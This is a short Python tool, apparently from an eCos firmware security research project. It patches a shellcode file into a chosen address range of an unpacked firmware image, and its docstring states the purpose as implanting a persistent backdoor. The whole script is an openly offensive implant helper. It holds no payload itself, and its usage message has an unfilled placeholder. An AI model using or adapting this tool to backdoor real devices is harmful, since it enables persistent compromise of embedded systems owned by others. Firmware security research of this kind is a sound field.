#!/usr/bin/env python3
'''
Overwrite an unpacked firmware file section with the content of a shellcode
file from offset 'start' to offset 'end'.
This can be used to inject custom shellcode in a firmware to implant a persistent
backdoor.

Reference: https://ecos.wtf/2021/03/15/ecos-persistence-firmware
Author: Quentin Kaiser <quentin@ecos.wtf>
'''

import sys

LOAD_ADDRESS = 0x80004000

if __name__ == "__main__":

    if len(sys.argv) < 5:
        print("Usage: {} firmware shellcode start end")
        sys.exit(-1)

    firmware_file = sys.argv[1]
    shellcode_file = sys.argv[2]
    start_offset = int(sys.argv[3], 16) - LOAD_ADDRESS
    end_offset = int(sys.argv[4], 16) - LOAD_ADDRESS

    available_space = end_offset - start_offset

    print("Available space: {} bytes".format(available_space))

    with open(shellcode_file, 'rb') as f:
        shellcode = f.read()

    if len(shellcode) > available_space:
        print("Not enough available space to fit shellcode")
        sys.exit(-1)

    padding = b"\x00" * (available_space - len(shellcode))



    print("Overwriting firmware file with shellcode.")
    with open(firmware_file, 'r+b') as f:
        f.seek(start_offset)
        f.write(shellcode)
        f.write(padding)
